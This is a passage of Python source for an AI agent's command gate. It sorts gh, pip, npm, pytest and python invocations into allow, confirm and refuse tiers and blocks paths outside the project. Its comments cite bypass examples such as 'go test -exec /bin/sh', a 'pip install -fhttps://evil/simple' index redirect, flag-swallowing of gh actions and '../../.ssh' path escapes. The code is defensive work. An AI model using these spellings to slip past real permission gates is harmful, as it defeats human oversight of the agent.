                f"Skill '{skill_name}' needs the '{policy.binary}' command, which "
                f"is not on PATH. {policy.summary} {policy.install_hint} "
                "The skill is refused rather than loaded without the tool it "
                "documents — a half-loaded skill produces confident answers from "
                "no data."
            )
        if policy not in policies:
            policies.append(policy)
    return policies


# ---------------------------------------------------------------------------
# Invocation gate
# ---------------------------------------------------------------------------


def normalize_binary(token: str) -> str:
    """The grant key for *token* as typed, or ``""`` when it is not a bare name.

    A path spelling never matches a grant: ``./gh`` and ``C:\\evil\\gh.exe`` are
    files the caller chose, not the CLI the skill declared, so they fall through
    to the ordinary command whitelist (which refuses them).
    """
    name = token.strip().strip('"').lower()
    if os.name == "nt" and name.endswith(".exe"):
        name = name[: -len(".exe")]
    return name if BINARY_NAME_RE.match(name) else ""


def _split_flag(
    token: str, *, single_dash_long: bool = False
) -> tuple[str, str | None]:
    """Split one flag token into ``(name, attached value)``.

    Mirrors how Go's ``pflag`` — what ``gh`` uses — actually parses, including
    the attached short form. ``-XDELETE``, ``-X=DELETE``, and ``--method=DELETE``
    all carry their value in the token; missing that is how a method rule gets
    bypassed by deleting one space.

    *single_dash_long* switches to the OTHER convention, Go's standard ``flag``
    package: ``-exec`` is one flag named ``exec``, not ``-e`` carrying ``xec``.
    Reading Go's flags the pflag way is a live bypass, not a cosmetic
    difference — ``-exec`` splits into an ``-e`` nothing denies, and ``go test
    -exec /bin/sh`` runs a shell. Both spellings normalise to one leading dash
    so a rule need list ``-exec`` only once.
    """
    if single_dash_long and token.startswith("-"):
        name, _, attached = token.lstrip("-").partition("=")
        return f"-{name}", attached or None
    if token.startswith("--"):
        name, _, attached = token.partition("=")
        return name, attached if attached else None
    name, rest = token[:2], token[2:]
    return name, rest.lstrip("=") or None


def _flag_name(token: str, *, single_dash_long: bool = False) -> str:
    """The flag's name, without any value attached to the same token."""
    return _split_flag(token, single_dash_long=single_dash_long)[0]


def validate_invocation(policy: BinaryPolicy, argv: Sequence[str]) -> str | None:
    """May this invocation run with **nobody asked**? Returns an error, or None.

    The narrow question, and the one a caller deciding whether to skip the
    confirmation prompt must ask. ``None`` means yes — the ALLOW tier only. A
    write the user *could* approve answers with the CONFIRM message rather than
    ``None``, so a caller that has not been taught about the third tier keeps
    refusing writes instead of running them unasked.

    Use :func:`classify_invocation` where the three tiers are actually
    distinguished (a host that can raise a prompt).

    *argv* is the shlex-split command, ``argv[0]`` being the binary.
    """
    decision = classify_invocation(policy, argv)
    return None if decision.allowed else decision.message


def _refuse(message: str) -> InvocationDecision:
    return InvocationDecision(REFUSE, message)


def _escaping_value(policy: BinaryPolicy, name: str, value: str | None) -> str:
    """The refusal for a path-valued flag aimed outside the checkout."""
    spelled = " ".join(filter(None, (name, value)))
    return (
        f"'{policy.binary} {spelled}' is not allowed: {name} names a file this "
        "command writes, and it has to stay inside the project — no leading "
        "'/', drive letter, or '..' component. Use a path relative to the "
        "checkout."
    )


def _known_flags(policy: BinaryPolicy, rule: Subcommand) -> frozenset[str]:
    """Every flag *rule* declares, in any of the four ways it can declare one."""
    return (
        rule.allowed_flags
        | policy.bare_flags
        | rule.inline_value_flags
        | rule.path_value_flags
        | frozenset(rule.flag_values)
        | frozenset(rule.value_flags)
        | frozenset(rule.flag_value_prefixes)
    )


def _is_known_flag(policy: BinaryPolicy, rule: Subcommand, name: str) -> bool:
    return name in _known_flags(policy, rule)


def _confirm(
    policy: BinaryPolicy, rule: Subcommand, spelled: str
) -> InvocationDecision:
    """The CONFIRM verdict for *spelled*, in this rule's own words."""
    return InvocationDecision(
        CONFIRM,
        f"'{spelled}' {rule.confirm_reason or policy.confirm_summary}, so it "
        "runs only after you approve this exact command.",
    )


def _denied_operand(rule: Subcommand, binary: str, token: str | None) -> str | None:
    """The refusal *token* earns as an operand or a flag value, or None.

    Applied to both because the distinction is spelling, not substance: for
    ``pip``, ``install https://x`` and ``install -r https://x`` fetch and run
    the same remote code.
    """
    if not token or not rule.denied_operand_prefixes:
        return None
    lowered = token.lower()
    for prefix, reason in rule.denied_operand_prefixes.items():
        # A scheme-carrying prefix is matched anywhere in the token: PEP 508's
        # `pkg @ https://…` puts the package name in front of the URL, and that
        # is the same fetch-and-run as the bare URL.
        anywhere = ":" in prefix or "+" in prefix
        if lowered.startswith(prefix) or (anywhere and prefix in lowered):
            return f"'{binary} … {token}' is not allowed: {reason}."
    return None


def classify_invocation(
    policy: BinaryPolicy, argv: Sequence[str]
) -> InvocationDecision:
    """Sort one granted invocation into ALLOW / CONFIRM / REFUSE.

    *argv* is the shlex-split command, ``argv[0]`` being the binary.

    Deciding, not enforcing: a ``CONFIRM`` verdict is the gate saying the user
    may be *asked*, never that the command has been approved. The approval
    itself lives in ``Agent._execute_tool``.
    """
    tokens = list(argv[1:])

    if policy.positional is not None:
        return _classify_positional_invocation(policy, tokens)

    allowed_subcommands = ", ".join(sorted(policy.subcommands))

    # Leading flags may only be the valueless ones (`gh --version`); anything
    # else before the subcommand could carry a value and shift the parse.
    index = 0
    while index < len(tokens) and tokens[index].startswith("-"):
        if (
            _flag_name(tokens[index], single_dash_long=policy.single_dash_long)
            not in policy.bare_flags
        ):
            return _refuse(
                f"'{policy.binary} {tokens[index]}' is not allowed: only "
                f"{', '.join(sorted(policy.bare_flags))} may precede a subcommand. "
                f"Put the subcommand first, e.g. '{policy.binary} "
                f"{sorted(policy.subcommands)[0]} ...'."
            )
        index += 1

    if index >= len(tokens):
        return _ALLOWED  # bare `gh`, `gh --version` — help text only

    subcommand = tokens[index].lower()
    rule = policy.subcommands.get(subcommand)
    if rule is None:
        # Only mention the write tier when this policy actually has one — a
        # read-only binary promising "writes ask you first" sends the model
        # hunting for a write that does not exist.
        has_writes = any(r.confirm_actions for r in policy.subcommands.values())
        tiers = (
            "reads run straight through, and the few writes among them ask you "
            "first. "
            if has_writes
            else ""
        )
        return _refuse(
            f"'{policy.binary} {subcommand}' is not allowed. This skill's grant "
            f"covers these {policy.binary} commands: {allowed_subcommands} — "
            f"{tiers}{policy.refuse_note}"
        )

    rest = tokens[index + 1 :]

    # The action must be the FIRST token after the subcommand. Not a style rule
    # — it is what keeps GAIA's verdict and cobra's dispatch on the same token.
    #
    # ``gh``'s parser strips a value for any flag it cannot prove is boolean AT
    # THAT LEVEL, including one it has never heard of. So in
    # ``gh label -f list create``, cobra eats ``list`` as ``-f``'s value and
    # dispatches ``create`` — while a scanner that merely skips unknown flags
    # sees ``list`` and calls it a read. That divergence turns a repo write into
    # an unprompted one, and no allowlist of value-flags closes it: the next gh
    # release can add a flag this table has never seen.
    #
    # Refusing a leading flag removes the ambiguity instead of chasing it. It
    # costs nothing real — nobody writes ``gh issue --repo x list`` — and the
    # refusal says how to spell it.
    # Only where there IS an action to swallow. A `confirm`-only rule
    # (`npm ci`) has none: every non-flag token is refused wherever it sits,
    # and no flag of such a rule is declared value-taking, so nothing can be
    # eaten. Applying the rule there would refuse `npm ci --no-audit` with a
    # message about an action that does not exist.
    has_actions = bool(rule.actions or rule.confirm_actions)
    if (
        not rule.free_form
        and has_actions
        and rest
        and rest[0].startswith("-")
        and rest[0] != "-"
    ):
        return _refuse(
            f"'{policy.binary} {subcommand} {rest[0]}' is not allowed: the "
            f"action has to come first. Write '{policy.binary} {subcommand} "
            f"<action> {rest[0]} ...' instead — allowed actions are "
            f"{_spell_actions(rule)}. A flag ahead of the action can swallow it "
            f"and leave a different action in its place, so {policy.binary} "
            "would run something other than what was checked."
        )

    denied_flags = rule.denied_flags

    action: str | None = None
    cursor = 0
    while cursor < len(rest):
        token = rest[cursor]
        cursor += 1
        if not token.startswith("-") or token == "-":
            denial = _denied_operand(rule, policy.binary, token)
            if denial is not None:
                return _refuse(denial)
            if rule.no_operands:
                return _refuse(
                    f"'{policy.binary} {subcommand} {token}' is not allowed: "
                    f"'{policy.binary} {subcommand}' reads; naming something "
                    "after it makes it a write this grant does not offer."
                )
            if action is None:
                action = token
            continue

        name, inline = _split_flag(token, single_dash_long=policy.single_dash_long)
        # Checked before the action is classified, so a denied flag refuses the
        # call outright — a confirmable write carrying one never reaches a
        # prompt, because the flag is the escalation, not the write.
        if name in denied_flags:
            reason = rule.denied_flag_reasons.get(
                name,
                "that flag sends a request body, which makes the call a write",
            )
            return _refuse(
                f"'{policy.binary} {subcommand} {name}' is not allowed: {reason}."
            )

        # A flag this rule only ever reviewed as VALUELESS must not arrive
        # carrying a value. `pip install -fhttps://evil/simple` is one token,
        # and dropping its value re-points the index behind a prompt that
        # shows the flag as harmless. The positional path has always refused
        # this shape; the subcommand path has to as well.
        if name in rule.allowed_flags and inline is not None:
            return _refuse(
                f"'{policy.binary} {subcommand} {token}' is not allowed: "
                f"{name} takes no value under this grant, so a value attached "
                "to it would go unchecked. Pass it on its own."
            )

        if name in rule.inline_value_flags:
            if inline is None:
                return _refuse(
                    f"'{policy.binary} {subcommand} {name}' is not allowed "
                    f"spaced: write '{name}=<value>'. Spaced, the value cannot "
                    "be told apart from the operand this subcommand refuses."
                )
            denial = _denied_operand(rule, policy.binary, inline)
            if denial is not None:
                return _refuse(denial)
            continue

        if rule.strict_flags and not _is_known_flag(policy, rule, name):
            return _refuse(
                f"'{policy.binary} {subcommand} {name}' is not allowed. This "
                f"grant reads {policy.binary}'s flags as an allowlist, because "
                "a flag of this CLI can name a program to run; it covers "
                f"{', '.join(sorted(_known_flags(policy, rule)))}."
            )

        takes_value = (
            name in rule.flag_values
            or name in rule.value_flags
            or name in rule.path_value_flags
        )
        value = inline
        if takes_value and inline is None:
            value = rest[cursor] if cursor < len(rest) else None
            cursor += 1  # the value is never the action positional

        if takes_value:
            denial = _denied_operand(rule, policy.binary, value)
            if denial is not None:
                return _refuse(denial)
            if name in rule.path_value_flags and (
                value is None or _unsafe_operand(value)
            ):
                return _refuse(_escaping_value(policy, name, value))

        if name in rule.flag_values:
            allowed = rule.flag_values[name]
            if value is None or value.lower() not in allowed:
                spelled = " ".join(filter(None, (name, value)))
                return _refuse(
                    f"'{policy.binary} {subcommand} {spelled}' is not allowed: "
                    f"{name} may only be "
                    f"{', '.join(sorted(v.upper() for v in allowed))}. "
                    "Other methods can modify the remote."
                )

    if action is not None and action.lower().strip("/") in rule.denied_actions:
        return _refuse(
            f"'{policy.binary} {subcommand} {action}' is not allowed: it can "
            "mutate the remote even through what looks like a read."
        )

    if rule.free_form:
        # The subcommand carries the whole meaning (`git commit`, `npm run x`);
        # its first positional is data, so there is no action to classify.
        return (
            _confirm(policy, rule, f"{policy.binary} {subcommand}")
            if rule.confirm
            else _ALLOWED
        )

    if action is None:
        # `npm ci` — the bare subcommand IS the invocation, and it is a write.
        if rule.confirm:
            return _confirm(policy, rule, f"{policy.binary} {subcommand}")
        return _refuse(
            f"'{policy.binary} {subcommand}' needs an action: "
            f"{_spell_actions(rule)}."
        )

    if action.lower() in rule.confirm_actions:
        return _confirm(policy, rule, f"{policy.binary} {subcommand} {action.lower()}")

    if action.lower() not in rule.actions:
        if rule.confirm and not rule.actions:
            # `npm install` is the lockfile install this grant offers; the same
            # word plus a package name is a fetch-and-run of someone else's code.
            return _refuse(
                f"'{policy.binary} {subcommand} {action}' is not allowed: this "
                f"grant covers '{policy.binary} {subcommand}' on its own, "
                "acting on what the project already declares. Naming something "
                "on the command line makes it act on that instead, which is a "
                "different call than the one a prompt would describe."
            )
        return _refuse(
            f"'{policy.binary} {subcommand} {action}' is not allowed. "
            f"Allowed {subcommand} actions: {_spell_actions(rule)}."
        )

    return _ALLOWED


def classify_ungranted_invocation(
    policy: BinaryPolicy, argv: Sequence[str]
) -> InvocationDecision:
    """The verdict for a policed binary invoked with **no skill grant at all**.

    Only :attr:`BinaryPolicy.ungranted` subcommands are reachable, and only at
    ALLOW: with no skill loaded there is no consent to point at, so a CONFIRM
    prompt would be asking the user to approve a capability nobody declared.

    Nearly every policy leaves ``ungranted`` empty and this answers REFUSE. It
    is non-empty only for a binary that had a read-only floor in the shell
    tool's whitelist *before* it had a policy — ``git status`` — so that floor
    keeps working without the binary needing a second, looser table beside
    this one.
    """
    if not policy.ungranted:
        return _refuse(
            f"Command '{policy.binary}' is not available to this agent. It is "
            "granted only to a skill that declares "
            f"'shell:execute:{policy.binary}' in its SKILL.md — load that skill "
            "first."
        )

    subcommand = next(
        (token.lower() for token in argv[1:] if not token.startswith("-")), ""
    )
    if not subcommand:
        # Bare `git` / `git --version` — help text, and allowed before this
        # binary had a policy. Nothing to gate.
        return classify_invocation(policy, argv)
    if subcommand in policy.ungranted:
        # Inside the floor, the full policy still applies: `git branch` reads,
        # `git branch -D` is a denied flag either way.
        decision = classify_invocation(policy, argv)
        if decision.outcome != CONFIRM:
            return decision

    spelled = f"{policy.binary} {subcommand}".strip()
    return _refuse(
        f"'{spelled}' needs a skill grant. Without one this agent runs only "
        f"read-only {policy.binary}: {', '.join(sorted(policy.ungranted))}. "
        "Anything that changes state — including every write this policy can "
        f"offer — requires a skill declaring 'shell:execute:{policy.binary}' "
        "in its SKILL.md; load that skill first."
    )


def _spell_actions(rule: Subcommand) -> str:
    """The subcommand's actions, saying which ones stop to ask.

    One string rather than two lists: a model reading "allowed actions: list,
    view" concludes it cannot comment at all and goes back to drafting, which
    is the dead end this tier exists to remove.
    """
    reads = ", ".join(sorted(rule.actions))
    if not rule.confirm_actions:
        return reads
    writes = ", ".join(sorted(rule.confirm_actions))
    asks = (
        "which asks you to approve it first"
        if len(rule.confirm_actions) == 1
        else "which ask you to approve them first"
    )
    if not reads:
        return f"{writes} ({asks})"
    return f"{reads} — plus {writes}, {asks}"


_UNSAFE_OPERAND_RE = re.compile(r"^[a-zA-Z]:[\\/]")


def _unsafe_operand(token: str) -> bool:
    """True when *token* could name a path outside the project checkout.

    Purely lexical — ``validate_invocation`` is never given a cwd, so it can
    only refuse shapes that are never a legitimate in-repo test path: a POSIX
    absolute path, a Windows drive letter, or a ``..`` path component.

    It is a second line rather than the only one: the shell tool's own
    path-traversal scan skips a granted segment only when the policy declares
    :attr:`BinaryPolicy.remote_operands`, which ``gh`` does and no local CLI
    does. Both checks run for ``pytest``, ``python`` and the formatters.
    """
    if token.startswith(("/", "\\")):
        return True
    if _UNSAFE_OPERAND_RE.match(token):
        return True
    return ".." in re.split(r"[\\/]", token)


def _classify_positional_invocation(
    policy: BinaryPolicy, tokens: Sequence[str]
) -> InvocationDecision:
    """:func:`classify_invocation` for a :attr:`BinaryPolicy.positional` binary.

    No subcommand step: every token is either a path operand or a flag, and
    flags are checked against an ALLOWLIST (``rule.allowed_flags`` /
    ``value_flags`` / ``flag_values`` / ``flag_value_prefixes``), not the
    subcommand path's denylist — see the "Flags are an ALLOWLIST here"
    comment on the ``pytest`` entry for why.

    Two shapes end the scan early, because after them the tokens stop being
    this binary's: :attr:`Subcommand.delegate_flag` (``python -m pytest`` is
    re-classified as ``pytest``) and :attr:`Subcommand.script_args` (after
    ``python util/lint.py``, ``--all`` is lint.py's flag, not python's).
    """
    rule = policy.positional
    known_flags = _known_flags(policy, rule)

    cursor = 0
    while cursor < len(tokens):
        token = tokens[cursor]
        cursor += 1

        if not token.startswith("-") or token == "-":
            denial = _denied_operand(rule, policy.binary, token)
            if denial is not None:
                return _refuse(denial)
            if rule.path_operands and _unsafe_operand(token):
                return _refuse(
                    f"'{policy.binary} {token}' is not allowed: operand paths "
                    "must stay inside the project checkout — no leading '/', "
                    "drive letter, or '..' component."
                )
            if rule.script_args:
                return _classify_script_arguments(policy, token, tokens[cursor:])
            continue

        name, inline = _split_flag(token, single_dash_long=policy.single_dash_long)

        if name in rule.denied_flags:
            reason = rule.denied_flag_reasons.get(
                name, "it is outside this grant's read-only flag set"
            )
            return _refuse(f"'{policy.binary} {name}' is not allowed: {reason}.")

        if name in rule.allowed_flags or name in policy.bare_flags:
            if inline is not None:
                # A bundled/'='-attached form on a flag we only ever validated
                # as bare (`-xvs`, `--quiet=1`) could smuggle an unreviewed
                # flag or value past this allowlist unexamined.
                return _refuse(
                    f"'{policy.binary} {token}' is not allowed: {name} takes "
                    "no value — pass it on its own, e.g. "
                    f"'{policy.binary} {name} ...' not bundled or '='-attached."
                )
            continue

        takes_value = (
            name in rule.flag_values
            or name in rule.value_flags
            or name in rule.path_value_flags
            or name in rule.flag_value_prefixes
        )
        if not takes_value:
            return _refuse(
                f"'{policy.binary} {name}' is not allowed. This skill's grant "
                f"covers a fixed set of flags: {', '.join(sorted(known_flags))}."
            )

        value = inline
        if inline is None:
            value = tokens[cursor] if cursor < len(tokens) else None
            cursor += 1  # the value is never mistaken for a path operand

        denial = _denied_operand(rule, policy.binary, value)
        if denial is not None:
            return _refuse(denial)

        if name in rule.path_value_flags and (value is None or _unsafe_operand(value)):
            return _refuse(_escaping_value(policy, name, value))

        if name in rule.flag_values:
            allowed = rule.flag_values[name]
            if value is None or value.lower() not in allowed:
                spelled = " ".join(filter(None, (name, value)))
                return _refuse(
                    f"'{policy.binary} {spelled}' is not allowed: {name} may "
                    f"only be {', '.join(sorted(allowed))}."
                )
            if name == rule.delegate_flag:
                return _delegate(policy, value.lower(), tokens[cursor:])
        elif name in rule.flag_value_prefixes:
            prefixes = rule.flag_value_prefixes[name]
            if value is None or not any(
                value.lower().startswith(prefix) for prefix in prefixes
            ):
                spelled = " ".join(filter(None, (name, value)))
                return _refuse(
                    f"'{policy.binary} {spelled}' is not allowed: {name} only "
                    f"accepts a value starting with "
                    f"{', '.join(sorted(prefixes))!r}."
                )
        # else: a bare `value_flags` entry (e.g. -k, -m, --maxfail) — any
        # value is accepted, matching gh's `value_flags` semantics.

    return _ALLOWED


def _delegate(
    policy: BinaryPolicy, module: str, rest: Sequence[str]
) -> InvocationDecision:
    """Re-classify ``<binary> -m <module> …`` against *module*'s own policy.

    The rule that keeps ``-m`` from being a hole straight through the table:
    ``python -m pytest --pdb`` must be refused for exactly the reason
    ``pytest --pdb`` is. Every value a ``delegate_flag`` accepts therefore has
    to be a policed binary — enforced by the flag's ``flag_values`` allowlist
    plus a table-wide test, so a module added without a policy fails loudly
    here rather than running unchecked.
    """
    target = BINARY_POLICIES.get(module)
    if target is None:
        raise KeyError(
            f"BinaryPolicy({policy.binary!r}) accepts '-m {module}' but "
            f"BINARY_POLICIES has no entry for {module!r}, so the delegated "
            "invocation cannot be gated. Every delegate_flag value must name a "
            "policed binary."
        )
    return classify_invocation(target, [module, *rest])


#: The leading flag of a token, so a path attached to it can be checked too.
#: ``-o../x`` and ``--config=/etc/x`` both carry a path the bare
#: :func:`_unsafe_operand` scan would read as one opaque word.
_ATTACHED_VALUE_RE = re.compile(r"^-+[A-Za-z0-9][A-Za-z0-9-]*[=:]?")


def _operand_escapes(token: str) -> bool:
    """True when *token*, or a path attached to it, points outside the checkout.

    Three shapes carry a path in one token and all three have to be read:
    ``../x`` bare, ``key=../x`` (a script's own option syntax), and ``-o../x``
    (a short flag with its value attached).
    """
    if _unsafe_operand(token):
        return True
    if _unsafe_operand(token.partition("=")[2]):
        return True
    if not token.startswith("-"):
        return False
    attached = _ATTACHED_VALUE_RE.sub("", token, count=1)
    return bool(attached) and _unsafe_operand(attached)


def _classify_script_arguments(
    policy: BinaryPolicy, script: str, rest: Sequence[str]
) -> InvocationDecision:
    """The verdict once a positional binary has been handed a program to run.

    ``python util/lint.py --all --fix`` — ``--all`` is lint.py's flag, and this
    table has no opinion on another program's argument grammar. Nor does it
    need one: running an in-checkout script is the trust boundary the grant
    already crossed (the same one ``execute_python_file`` crosses ungated), and
    the script, not its flags, is the capability.

    What still holds is containment: no argument may point outside the
    checkout, so a granted script cannot be aimed at ``../../.ssh``.
    """
    for token in rest:
        if _operand_escapes(token):
            return _refuse(
                f"'{policy.binary} {script} … {token}' is not allowed: an "
                "argument may not point outside the project checkout — no "
                "leading '/', drive letter, or '..' component."
            )
    return _ALLOWED
